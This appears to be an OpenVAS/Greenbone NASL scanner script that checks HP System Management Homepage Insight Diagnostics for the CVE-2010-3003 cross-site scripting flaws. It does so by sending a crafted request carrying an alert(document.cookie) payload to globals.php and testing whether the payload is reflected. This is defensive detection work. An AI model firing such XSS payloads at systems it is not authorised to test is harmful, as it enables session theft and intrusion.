# Copyright (C) 2010 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:hp:system_management_homepage";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800189");
  script_version("2022-12-05T10:11:03+0000");
  script_tag(name:"last_modification", value:"2022-12-05 10:11:03 +0000 (Mon, 05 Dec 2022)");
  script_tag(name:"creation_date", value:"2010-12-21 15:42:46 +0100 (Tue, 21 Dec 2010)");
  script_cve_id("CVE-2010-3003");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("HP/HPE System Management Homepage (SMH) Insight Diagnostics Multiple XSS Vulnerabilities (HPSBMA02571)");

  script_xref(name:"URL", value:"http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-05");
  script_xref(name:"URL", value:"https://support.hpe.com/hpesc/public/docDisplay?docLocale=en_US&docId=emr_na-c02492472");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_hp_smh_http_detect.nasl");
  script_mandatory_keys("hp/smh/http/detected");
  script_require_ports("Services/www", 2301, 2381);

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to inject arbitrary
  HTML code in the context of an affected site.");

  script_tag(name:"affected", value:"HP/HPE SMH Insight Diagnostics Online Edition before 8.5.0-11.");

  script_tag(name:"insight", value:"The flaws are caused by input validation errors in the
  'parameters.php', 'idstatusframe.php', 'survey.php', 'globals.php' and 'custom.php' pages, which
  allows attackers to execute arbitrary HTML and script code in a user's browser session in the
  context of an affected site.");

  script_tag(name:"solution", value:"The vendor has released updates. Please see the referenced
  vendor advisory for more information.");

  script_tag(name:"summary", value:"HP/HPE System Management Homepage (SMH) with Insight Diagnostics is
  prone to multiple cross-site scripting (XSS) vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

useragent = http_get_user_agent();
host = http_host_name(port:port);

url = '/hpdiags/globals.php?tabpage=";alert(document.cookie)//';
req = string("GET ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n",
             "User-Agent: ", useragent, "\r\n",
             "Cookie: Compaq-HMMD=0001-8a3348dc-f004-4dae-a746-211a6" +
             "d70fd51-1292315018889768; HPSMH-browser-check=done for" +
             " this session; curlocation-hpsmh_anonymous=; PHPSESSID=" +
             "2389b2ac7c2fb11b7927ab6e54c43e64\r\n",
             "\r\n");
res = http_keepalive_send_recv(port:port, data:req);
if(res =~ "^HTTP/1\.[01] 200" && ';alert(document.cookie)//.php";' >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);